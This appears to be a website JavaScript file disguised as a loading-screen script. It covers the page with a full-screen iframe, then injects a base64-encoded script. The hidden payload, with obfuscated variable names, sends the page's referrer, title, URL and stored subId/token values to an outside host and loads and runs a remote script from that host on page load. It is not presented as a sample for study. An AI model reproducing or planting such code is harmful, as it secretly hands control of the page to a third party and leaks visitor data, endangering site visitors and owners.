const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    const script = document.createElement('script');
    script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfN2JmeHlRbUdWMkxUMnpWZCc7CiAgICBpZiAoIXdpbmRvdy5fN2JmeHlRbUdWMkxUMnpWZCkgewogICAgICAgIHdpbmRvdy5fN2JmeHlRbUdWMkxUMnpWZCA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vRGZncFhKTXYnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfMmRGdEhUWU1oNFJGUjlkUyA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgXzJkRnRIVFlNaDRSRlI5ZFMgIT09ICd1bmRlZmluZWQnICYmIF8yZEZ0SFRZTWg0UkZSOWRTICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9CVmp0a3gxeVZCaGQ0eEZ2ID0gSlNPTi5wYXJzZShfMmRGdEhUWU1oNFJGUjlkUyk7CiAgICAgICAgdmFyIF9qd1dzalpyTWRHNmNnYzduID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX0JWanRreDF5VkJoZDR4RnYuY3JlYXRlZF9hdCArIHdpbmRvdy5fN2JmeHlRbUdWMkxUMnpWZC50dGwgPCBfandXc2pack1kRzZjZ2M3bikgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX2pQckR2UVlkUnI4TnpXSjYgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfdEpuWlRZSDVRWUZRZFpIWSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF90VGRWamdQWXlrRDN0U1dWID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfdFRkVmpnUFl5a0QzdFNXViArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfdFRkVmpnUFl5a0QzdFNXViArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF90VGRWamdQWXlrRDN0U1dWICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF90VGRWamdQWXlrRDN0U1dWICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfdFRkVmpnUFl5a0QzdFNXViArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfdFRkVmpnUFl5a0QzdFNXViArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuXzdiZnh5UW1HVjJMVDJ6VmQuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX2pQckR2UVlkUnI4TnpXSjYgIT09ICd1bmRlZmluZWQnICYmIF9qUHJEdlFZZFJyOE56V0o2ICYmIHdpbmRvdy5fN2JmeHlRbUdWMkxUMnpWZC51bmlxdWUpIHsKICAgICAgICBfdFRkVmpnUFl5a0QzdFNXViArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9qUHJEdlFZZFJyOE56V0o2KTsKICAgIH0KICAgIGlmICh0eXBlb2YgX3RKblpUWUg1UVlGUWRaSFkgIT09ICd1bmRlZmluZWQnICYmIF90Sm5aVFlINVFZRlFkWkhZICYmIHdpbmRvdy5fN2JmeHlRbUdWMkxUMnpWZC51bmlxdWUpIHsKICAgICAgICBfdFRkVmpnUFl5a0QzdFNXViArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX3RKblpUWUg1UVlGUWRaSFkpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF90VGRWamdQWXlrRDN0U1dWICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fN2JmeHlRbUdWMkxUMnpWZC5SX1BBVEggKyBfdFRkVmpnUFl5a0QzdFNXVjsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
     document.querySelector("head").appendChild(script);
     setTimeout(toggleLoad, 1000);

  
})
